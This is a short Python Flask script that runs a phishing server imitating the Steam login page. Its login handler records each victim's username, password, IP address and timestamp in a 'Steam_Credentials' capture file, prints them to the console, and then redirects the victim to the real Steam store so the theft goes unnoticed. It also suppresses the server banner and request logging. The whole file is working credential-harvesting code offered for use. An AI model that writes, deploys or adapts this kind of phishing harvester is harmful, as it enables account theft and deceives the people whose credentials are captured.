import subprocess
from flask import Flask, render_template, request, redirect
import os
import datetime
import flask.cli
import logging

flask.cli.show_server_banner = lambda *a, **k: None
logging.getLogger('werkzeug').setLevel(logging.ERROR)


app = Flask(__name__)


BASE_DIR = os.path.dirname(os.path.abspath(__file__))

path = "Steam_Credentials"
os.makedirs(path,exist_ok=True)
LOG_FILE = "steam_logins.txt"
full = os.path.join(path,LOG_FILE)


if not os.path.exists(LOG_FILE):
    with open(full, "a", encoding="utf-8") as f:
        f.write("🔥 Steam Login Captures 🔥\n")
        f.write("="*50 + "\n\n")

@app.route('/')
def login_page():
    return render_template('steam.html')

@app.route('/login', methods=['POST'])
def handle_login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ip_address = request.remote_addr

    with open(full, 'a', encoding='utf-8') as f:
        f.write(f"Time :{timestamp} \n | IP :{ip_address} \n | Username :{username} \n | Password :{password}\n")
        print(f"✅ Save Information: {username} - {password} - IP: {ip_address}")

    return redirect("https://store.steampowered.com/")


def run():
    app.run(host="0.0.0.0", port=5001, debug=False, use_reloader=False)


run()
